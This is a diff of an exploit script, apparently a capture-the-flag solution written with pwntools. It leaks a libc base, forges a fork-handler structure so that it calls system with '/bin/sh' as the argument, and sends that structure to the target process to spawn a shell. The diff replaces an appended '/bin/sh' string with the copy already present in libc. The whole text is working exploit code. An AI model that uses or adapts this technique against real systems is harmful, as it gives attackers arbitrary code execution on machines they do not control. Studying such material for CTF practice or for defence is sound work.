@@ -68,11 +68,17 @@ log.success(f"libc base: {hex(libc.address)}")
 fork_handlers = libc.sym.re_syntax_options + 0x80
 log.success(f"fork_handlers: {hex(fork_handlers)}")
 
-cmd_offset = len(forge(fork_handlers, libc.sym.system, libc.sym._exit))
+"""
+cmd_offset = len(forge(fork_handlers, libc.sym.system))
 cmd_addr = fork_handlers + cmd_offset
 
-data = forge(fork_handlers, libc.sym.system, libc.sym._exit, rdi=cmd_addr)
+data = forge(fork_handlers, libc.sym.system, rdi=cmd_addr)
 data += b"/bin/sh\x00"
+"""
+
+bin_sh = next(libc.search(b"/bin/sh\x00"))
+log.success(f"/bin/sh: {hex(bin_sh)}")
+data = forge(fork_handlers, libc.sym.system, rdi=bin_sh)
 
 req = p64(fork_handlers) + p64(len(data))
 io.send(req)
